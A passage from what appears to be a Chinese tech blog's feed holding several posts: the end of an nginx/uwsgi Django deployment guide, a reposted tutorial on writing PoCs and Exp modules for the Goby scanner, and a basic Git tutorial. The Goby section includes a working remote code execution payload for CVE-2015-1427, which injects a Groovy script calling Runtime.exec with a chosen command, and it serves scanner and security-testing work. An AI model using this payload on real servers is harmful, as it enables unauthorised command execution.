&#x27;</span><br><span class="line">                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    access_log  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile            on;</span><br><span class="line">    tcp_nopush          on;</span><br><span class="line">    tcp_nodelay         on;</span><br><span class="line">    keepalive_timeout   65;</span><br><span class="line">    types_hash_max_size 4096;</span><br><span class="line"></span><br><span class="line">    include             /etc/nginx/mime.types;</span><br><span class="line">    default_type        application/octet-stream;</span><br><span class="line"></span><br><span class="line">    # Load modular configuration files from the /etc/nginx/conf.d directory.</span><br><span class="line">    # See http://nginx.org/en/docs/ngx_core_module.html#include</span><br><span class="line">    # for more information.</span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line"></span><br><span class="line">################################</span><br><span class="line">        server&#123;</span><br><span class="line">            listen 80;</span><br><span class="line">            server_name 127.0.0.1:80;</span><br><span class="line">            charset utf-8;</span><br><span class="line">            access_log off;</span><br><span class="line">            location /static &#123;</span><br><span class="line">                alias /root/test_django/mysite/static/; #要与之前django的setting.py中添加的static静态文件转移目录一致</span><br><span class="line">            &#125;</span><br><span class="line">            location / &#123;</span><br><span class="line">                uwsgi_pass  127.0.0.1:8000; #端口与原来的uwsgi中设置的端口一致，在第5步设置</span><br><span class="line">                include     /etc/nginx/uwsgi_params;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">################################</span><br></pre></td></tr></table></figure>

<p> 要留意备注的地方，要和UWSGI配置文件mysite.xml，还有项目路径对应上。<br>执行.&#x2F;nginx -t命令先检查配置文件是否有错，没有错就执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure>



<h2 id="四、测试Django程序"><a href="#四、测试Django程序" class="headerlink" title="四、测试Django程序"></a>四、测试Django程序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启动nginx</span><br><span class="line">/usr/sbin/nginx</span><br><span class="line"># 启动uwsgi</span><br><span class="line">uwsgi -x /home/python_project/DjangoFan/socket.xml</span><br><span class="line"># 强制关闭</span><br><span class="line">sudo pkill -f uwsgi -9</span><br><span class="line">sudo pkill -f nginx -9</span><br><span class="line"># 重启nginx</span><br><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>

<p>访问网站地址：<code>ip:80</code>，访问成功：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/image-20220106114825566.png" alt="image-20220106114825566" style="zoom:50%;" />

]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>GobyPoc 编写</title>
    <url>/posts/3b2395b4.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://zhuanlan.zhihu.com/p/365409712">https://zhuanlan.zhihu.com/p/365409712</a></p>
<p>好好看，好好学。</p>
</blockquote>
<h2 id="0x001-准备环境"><a href="#0x001-准备环境" class="headerlink" title="0x001 准备环境"></a>0x001 准备环境</h2><p>Goby为PoC编写提交测试方便发布了…姑且叫PoC版。PoC版主要功能为登录后，可以在线提交 PoC，无需再提交到邮箱。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-4a7c3e46bba7daf6c5f3269f4c753764_1440w.jpg" alt="img"></p>
<p>然后还有两个连接，一个是《Goby漏洞编写指南》：</p>
<p><a href="https://link.zhihu.com/?target=https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide">https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide</a></p>
<p>还有《Goby已录漏洞列表》防止PoC撞车：</p>
<p><a href="https://link.zhihu.com/?target=https://shimo.im/sheets/hcoIpikMzpsVKgaC/aojnO/">https://shimo.im/sheets/hcoIpikMzpsVKgaC/aojnO/</a></p>
<h2 id="0x002-第一个-Goby-的-PoC"><a href="#0x002-第一个-Goby-的-PoC" class="headerlink" title="0x002 第一个 Goby 的 PoC"></a>0x002 第一个 Goby 的 PoC</h2><h3 id="2-1-简单的-PoC-制作"><a href="#2-1-简单的-PoC-制作" class="headerlink" title="2.1 简单的 PoC 制作"></a><strong>2.1 简单的 PoC 制作</strong></h3><p>实际上主要用到的功能在这里：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-d0d244d636d3f007c6da3e795141bbc4_1440w.jpg" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-fb6ea16c18803df0520b0a97bd9d4640_1440w.png" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-7a89e184901550f94b7cd44f15489eec_1440w.jpg" alt="img"></p>
<p>上图就能看到自定义PoC的界面样子了，具体填写的信息和填写标准参考上述的《Goby漏洞编写指南》，里边有命名规则等详细解释和参考，然后就是Requests的Response处理，Goby提供了“测试”功能可直接通过图形化界面自定义自己的Requests。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-45a6c2754df759f9596ae3cc7026fa98_1440w.jpg" alt="img"></p>
<p>这里以CVE-2015-1427为例，再完整的RCE中一共需要发送两次Requests。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-47d52485b3888dbc8e6dc0e0c8dee817_1440w.jpg" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-1d6c8bf3a472862b3356e9c8d4870a6a_1440w.jpg" alt="img"></p>
<p>然后Goby的PoC编辑界面提供了可选的单个或多个Requests，也提供了AND和OR可选的发包逻辑，方便发送多个Requests的自定义</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-f192211780983769fe6c41d5fe44f79a_1440w.jpg" alt="img"></p>
<p>之后的“响应测试”可对Response进行判断可选有返回状态码，Header和Body，大家按照自己需求点一点即可。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-0caebedd0facc6d9294db9b347a1d018_1440w.jpg" alt="img"></p>
<p>CVE-2015-1427需要两个Requests，再来一个即可，这里需要一个RCE返回结果的判断，对于轮子达人来说点一点就好制作很方便。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-b31d8afaaad5b7a8df3cbd26acd00c17_1440w.jpg" alt="img"></p>
<p>到这里两次Requests好了，最终的RCE判断也好了剩下就是测试PoC可用性了，上图所示右上角提供了“单ip扫描”直接测试。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-4e3487716ab90fef97e9cfafc4fe6cb7_1440w.jpg" alt="img"></p>
<p>在资产扫描完成的界面，输入query点击放大镜可以进行资产匹配，用来确定自己写的query可以正确匹配。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-beeca9af128e653a0a3ef00853442867_1440w.jpg" alt="img"></p>
<p>再去扫描中测试一番，这里每次对PoC进行修改之后都需要重启Goby（点左下角的重启也行）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-560ca8aab5522e6d9f9929aa5a53690f_1440w.jpg" alt="img"></p>
<h3 id="2-2-不太简单的PoC中的Exp"><a href="#2-2-不太简单的PoC中的Exp" class="headerlink" title="2.2 不太简单的PoC中的Exp"></a>2.2 不太简单的PoC中的Exp</h3><p>你以为PoC做好了？没有，一半了，如开头图中所示需要三个带Exp的漏洞，所有自己的PoC必须要Exp功能，然后Exp功能还没有图形化点一点的界面，而《Goby漏洞编写指南》中对Exp的制作也只有个例子，没看到详细解释（可能我没看全），但是有一个TP的demo，通过这个demo我们也能照猫画虎做Exp了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-2a5c80811d902f14748156d6c74f505c_1440w.jpg" alt="img"></p>
<p>制作Exp需要开启图形中的验证接口，你会好奇上图所示的“验证”为什么我没有，需要去手动编辑Exp模块了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/image-20220510235416765.png" alt="image-20220510235416765"></p>
<p>找到你要修改的 poc 直接编辑。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-25140708e2cc6f352c8fcf47bb3ac0fa_1440w.jpg" alt="img"></p>
<p>编辑器中可以看到你的PoC的json文件，默认的HasExp值为false，开启改true即可，ExpParams则是前端需要传递给 Exp 的参数，如要执行的命令。</p>
<p>以CVE-2015-1427为例需要自定义命令，一个输入参数，需要将ExpParams改为：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;ExpParams&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;cmd&quot;</span>,</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;input&quot;</span>,</span><br><span class="line">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure>

<p>不解释上述json了直接感受一下效果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-b3b9c2c6a84eed7aa9e6e9b31c2346d3_1440w.jpg" alt="img"></p>
<p>现在为止GUI中已经开启Exp了，但实际还没有“验证”功能，需要再回到“编辑器”中编写“验证功能”，找到json中的ExploitSteps默认值为null，继续以CVE-2015-1427为例需要两次Requests修改为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&quot;ExploitSteps&quot;: [</span><br><span class="line">    &quot;AND&quot;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Request&quot;: &#123;</span><br><span class="line">        &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">        &quot;uri&quot;: &quot;/website/blog/&quot;,</span><br><span class="line">        &quot;follow_redirect&quot;: true,</span><br><span class="line">        &quot;header&quot;: &#123;</span><br><span class="line">          &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">          &quot;Accept&quot;: &quot;*/*&quot;,</span><br><span class="line">          &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">          &quot;Accept-Language&quot;: &quot;en&quot;,</span><br><span class="line">          &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;data_type&quot;: &quot;text&quot;,</span><br><span class="line">        &quot;data&quot;: &quot;&#123; \&quot;name\&quot;: \&quot;cve-2015-1427\&quot; &#125;&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;ResponseTest&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;group&quot;,</span><br><span class="line">        &quot;operation&quot;: &quot;AND&quot;,</span><br><span class="line">        &quot;checks&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;item&quot;,</span><br><span class="line">            &quot;variable&quot;: &quot;$code&quot;,</span><br><span class="line">            &quot;operation&quot;: &quot;==&quot;,</span><br><span class="line">            &quot;value&quot;: &quot;201&quot;,</span><br><span class="line">            &quot;bz&quot;: &quot;&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;SetVariable&quot;: [</span><br><span class="line">        &quot;output|lastbody&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Request&quot;: &#123;</span><br><span class="line">        &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">        &quot;uri&quot;: &quot;/_search?pretty&quot;,</span><br><span class="line">        &quot;follow_redirect&quot;: true,</span><br><span class="line">        &quot;header&quot;: &#123;</span><br><span class="line">          &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">          &quot;Accept&quot;: &quot;*/*&quot;,</span><br><span class="line">          &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">          &quot;Accept-Language&quot;: &quot;en&quot;,</span><br><span class="line">          &quot;Content-Type&quot;: &quot;application/text&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;data_type&quot;: &quot;text&quot;,</span><br><span class="line">        &quot;data&quot;: &quot;&#123;\&quot;size\&quot;:1, \&quot;script_fields\&quot;: &#123;\&quot;lupin\&quot;:&#123;\&quot;lang\&quot;:\&quot;groovy\&quot;,\&quot;script\&quot;: \&quot;java.lang.Math.class.forName(\\\&quot;java.lang.Runtime\\\&quot;).getRuntime().exec(\\\&quot;&#123;&#123;&#123;cmd&#125;&#125;&#125;\\\&quot;).getText()\&quot;&#125;&#125;&#125;&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;ResponseTest&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;group&quot;,</span><br><span class="line">        &quot;operation&quot;: &quot;AND&quot;,</span><br><span class="line">        &quot;checks&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;item&quot;,</span><br><span class="line">            &quot;variable&quot;: &quot;$code&quot;,</span><br><span class="line">            &quot;operation&quot;: &quot;==&quot;,</span><br><span class="line">            &quot;value&quot;: &quot;200&quot;,</span><br><span class="line">            &quot;bz&quot;: &quot;&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;item&quot;,</span><br><span class="line">            &quot;variable&quot;: &quot;$body&quot;,</span><br><span class="line">            &quot;operation&quot;: &quot;contains&quot;,</span><br><span class="line">            &quot;value&quot;: &quot;460f7ccb583e25e09c0fe100a2c9e90d&quot;,</span><br><span class="line">            &quot;bz&quot;: &quot;&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;SetVariable&quot;: [</span><br><span class="line">        &quot;output|lastbody|regex|(?s)\&quot;lupin\&quot; : \\[ \&quot;(.*)\&quot; \\]&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure>

<p>可以看到上述json中 Requests 和PoC中的ScanSteps的Requests 是一致的，就不难理解是同样的发包，只不过一个在ScanSteps一个是ExploitSteps，现在应该也就大概理解这个json的大致功能了，上边看着乱简化一下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&quot;ExploitSteps&quot;: [</span><br><span class="line">    &quot;AND&quot;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Request&quot;: &#123;xxxxxx&#125;,</span><br><span class="line">      &quot;ResponseTest&quot;: &#123;xxxxxx&#125;,</span><br><span class="line">      &quot;SetVariable&quot;: [xxxxxx]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Request&quot;: &#123;xxxxxx&#125;,</span><br><span class="line">      &quot;ResponseTest&quot;: &#123;xxxxxx&#125;,</span><br><span class="line">      &quot;SetVariable&quot;: [xxxxxx]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure>

<p>到这里应该都指知道Requests用来发包，ResponseTest用来判断是否满足判断SetVariable则会在“验证”功能中回显Body。</p>
<p>我在看官方提供的Exp demo中发现TP的RCE去掉了ResponseTest，我也跟着试，结果只发送第一个Requests不发第二个，后续找@go0p发现是去掉了ResponseTest的锅。</p>
<p>最后控制一下RCE的回显，TP的demo中SetVariable写的是:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&quot;SetVariable&quot;: [</span><br><span class="line">        &quot;output|lastbody&quot;</span><br><span class="line">      ]</span><br></pre></td></tr></table></figure>

<p>这里的效果就是显示整个Body。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-f810ba982beff33f5e3d386b191c5f90_1440w.jpg" alt="img"></p>
<p>看起来比较凌乱，不过SetVariable中也有过滤可用，例如regex去正则。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&quot;SetVariable&quot;: [</span><br><span class="line">        &quot;output|lastbody|regex|(?s)\&quot;lupin\&quot; : \\[ \&quot;(.*)\&quot; \\]&quot;</span><br><span class="line">      ]</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Goby_Poc%E7%BC%96%E5%86%99/v2-63c78e495cbbbfe7541755e097e68cc6_1440w.jpg" alt="img"></p>
<p>到这里一个带Exp的PoC就制作好了，如果你觉得PoC逻辑编写没为题但又怎么都不成功就只能反复测试反复抓包了，找你的wireshark好帮手，慢慢测慢慢排，最终完整的PoC一定出的来。</p>
<blockquote>
<p>上述的PoC完整例子在：<a href="https://link.zhihu.com/?target=https://github.com/zhzyker/Goby-PoC">https://github.com/zhzyker/Goby-PoC</a></p>
</blockquote>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Goby</tag>
      </tags>
  </entry>
  <entry>
    <title>Github 基础教程</title>
    <url>/posts/6e0f3e76.html</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><h3 id="github是什么？"><a href="#github是什么？" class="headerlink" title="github是什么？"></a>github是什么？</h3><p>GitHub 是一个面向开源及私有软件项目的托管平台，因为只支持 Git 作为唯一的版本库格式进行托管，故名 GitHub。</p>
<p>GitHub 于 2008 年 4 月 10 日正式上线，除了 Git 代码仓库托管及基本的 Web 管理界面以外，还提供了订阅、讨论组、文本渲染、在线文件编辑器、协作图谱（报表）、代码片段分享（Gist）等功能。目前，其托管版本数量非常之多，而且其中不乏知名开源项目，例如 Ruby on Rails、jQuery、python 等。</p>
<h1 id="0x01-简单推送一个仓库"><a href="#0x01-简单推送一个仓库" class="headerlink" title="0x01 简单推送一个仓库"></a>0x01 简单推送一个仓库</h1><h3 id="注册账户以及创建仓库"><a href="#注册账户以及创建仓库" class="headerlink" title="注册账户以及创建仓库"></a>注册账户以及创建仓库</h3><p>······</p>
<h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><p>。。。。。。</p>
<h3 id="配置Git"><a href="#配置Git" class="headerlink" title="配置Git"></a>配置Git</h3><p>首先在本地创建<code>ssh key；</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;your_email@youremail.com&quot;</span><br><span class="line">eg:</span><br><span class="line">$ ssh-keygen -t rsa -C &quot;xxx@qq.com&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>表示我们指定 RSA 算法生成密钥，然后敲三次回车键，期间不需要输入密码，之后就就会生成两个文件，分别为id_rsa和id_rsa.pub，即密钥id_rsa和公钥id_rsa.pub. 对于这两个文件，其都为隐藏文件，默认生成在以下目录：</p>
<p>Linux 系统：~&#x2F;.ssh</p>
<p>Mac 系统：~&#x2F;.ssh</p>
<p>Windows 系统：C:\User\username\.ssh</p>
<p>Windows 10 ThinkPad：C:\Users\think.ssh</p>
<p>进去，打开<code>id_rsa.pub</code>，复制里面的<code>key</code>。</p>
<p>回到github上，进入 Account Settings（账户配置），左边选择SSH Keys，Add SSH Key,title随便填，粘贴在你电脑上生成的key。</p>
</blockquote>
<p>为了验证是否成功，在git bash下输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<h3 id="本地-Git-仓库"><a href="#本地-Git-仓库" class="headerlink" title="本地 Git 仓库"></a>本地 Git 仓库</h3><p>进入该仓库，并进行初始化：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git init</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Github%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20210626140139639.png" alt="image-20210626140139639"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git remote add origin git@github.com:python-cdf/python.git</span><br></pre></td></tr></table></figure>

<p>命令，关联远程仓库，其中origin为远程仓库的名字：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Github%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20210626140354342.png" alt="image-20210626140354342"></p>
<p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git pull origin master</span><br></pre></td></tr></table></figure>

<p>同步远程仓库和本地仓库：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Github基础教程/image-20210626140858103.png" alt="image-20210626140858103" style="zoom: 50%;" />

<p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git add test.txt</span><br><span class="line">git commit -m &quot;commit message&quot;</span><br></pre></td></tr></table></figure>

<p>将文件test.txt添加并提交到仓库：</p>
<p>再输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>

<p>将本地仓库修改（或者添加）的内容提交到远程仓库.</p>
<p><strong>在我们向远程仓库提交代码的时候，一定要先进行pull操作，再进行push操作，防止本地仓库与远程仓库不同步导致冲突的问题，尤其是第二种提交代码的情况，很容易就出现问题。</strong></p>
<h1 id="0x02-其他命令"><a href="#0x02-其他命令" class="headerlink" title="0x02 其他命令"></a>0x02 其他命令</h1><h3 id="1-git-status"><a href="#1-git-status" class="headerlink" title="1. git status"></a>1. git status</h3><p>查看仓库的状态，可以看到当前文件夹是否为仓库，可以看到是否有文件没有同步。通常执行完一个命令后，都会查看一下，使用频率很高。</p>
<h3 id="2-git-init"><a href="#2-git-init" class="headerlink" title="2. git init"></a>2. git init</h3><p>初始化为一个Git仓库，并且默认进入 Git 仓库的master分支，即主分支。这时，如果当前仓库中已有文件，输入<code>git status</code>命令后，会发现该文件没有被追踪，需要输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git add abc.txt</span><br><span class="line">或</span><br><span class="line">git add .</span><br></pre></td></tr></table></figure>

<p>将文件追踪到仓库。</p>
<h3 id="3-git-add"><a href="#3-git-add" class="headerlink" title="3. git add"></a>3. git add</h3><p>将文件<strong>添加</strong>到Git仓库，但是<code>git add</code>命令并没有把文件<strong>提交</strong>到 Git 仓库，而是把文件添加到了「临时缓冲区」，这个命令有效防止了我们错误提交的可能性。</p>
<h3 id="4-git-commit"><a href="#4-git-commit" class="headerlink" title="4. git commit"></a>4. git commit</h3><p>将文件提交到Git仓库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;V1.1 commit&quot;</span><br><span class="line">-m 表示提交的信息</span><br></pre></td></tr></table></figure>

<h3 id="5-git-log"><a href="#5-git-log" class="headerlink" title="5. git log"></a>5. git log</h3><p>打印Git仓库提交日志</p>
<h3 id="6-git-branch"><a href="#6-git-branch" class="headerlink" title="6. git branch"></a>6. git branch</h3><p>查看Git仓库的分支情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git branch a 	</span><br><span class="line">创建一个名为a的分支，但当前主分支仍不变。</span><br></pre></td></tr></table></figure>

<h3 id="7-git-checkout"><a href="#7-git-checkout" class="headerlink" title="7. git checkout"></a>7. git checkout</h3><p>切换到仓库的某一分支</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#切换到分支a</span><br><span class="line">git checkout a</span><br><span class="line"></span><br><span class="line">#在当前分支下，创建一个新分支并且切换到该分支</span><br><span class="line">git checkout -b abc</span><br></pre></td></tr></table></figure>

<h3 id="8-git-merge"><a href="#8-git-merge" class="headerlink" title="8. git merge"></a>8. git merge</h3><p>合并分支。切换到master分支，然后输入git merge a命令，将a分支合并到master分支：</p>
<blockquote>
<p>注意一点，那就是：在合并分支的时候，要考虑到两个分支是否有冲突，如果有冲突，则不能直接合并，需要先解决冲突；反之，则可以直接合并。</p>
</blockquote>
<h3 id="9-git-branch-d-amp-git-branch-D"><a href="#9-git-branch-d-amp-git-branch-D" class="headerlink" title="9. git branch -d &amp; git branch -D"></a>9. <strong>git branch -d &amp; git branch -D</strong></h3><p>删除分支和强制删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#删除分支a</span><br><span class="line">git branch -d a</span><br></pre></td></tr></table></figure>

<p>例如分支a的代码没有合并到主分支等，这时如果我们一定要删除该分支，那么我们可以通过命令git branch -D进行强制删除。</p>
<h3 id="10-git-tag"><a href="#10-git-tag" class="headerlink" title="10. git tag"></a>10. git tag</h3><p>为当前分支添加标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#添加标签V1.0</span><br><span class="line">git tag V1.0</span><br><span class="line">#查看标签记录</span><br><span class="line">git tag</span><br><span class="line">#切换到该标签下的代码状态</span><br><span class="line">git checkout V1.0</span><br></pre></td></tr></table></figure>

<h1 id="0x03-git-进阶"><a href="#0x03-git-进阶" class="headerlink" title="0x03 git 进阶"></a>0x03 git 进阶</h1><p>Linux 下使用git：</p>
<h3 id="1-设置git命令别名"><a href="#1-设置git命令别名" class="headerlink" title="1. 设置git命令别名"></a>1. 设置git命令别名</h3><p>查看git全局配置信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git commit -l</span><br><span class="line">//按q退出</span><br></pre></td></tr></table></figure>

<p>单独配置某项，如将<code>git status</code> 简化为 <code>git st</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global alias.st &quot;status&quot;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Github%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20210910170446841.png" alt="image-20210910170446841"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Github%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20210910170506109.png" alt="image-20210910170506109"></p>
<p>这里需要注意的一点是，通过 <code>~/.gitconfig</code> 可以进行全局配置（也就是针对所有项目），而每个项目下 <code>.git/config</code> 中的配置只针对这个项目。</p>
<p>上面的配置中包含了别名的配置以及其他配置，比如默认编辑器（执行git commit 时所使用的编辑器）、用户名和邮箱等。gitconfig 的可配置项还有很多，可以通过Google搜索关键词 git config best practices 来获得更多相关内容。</p>
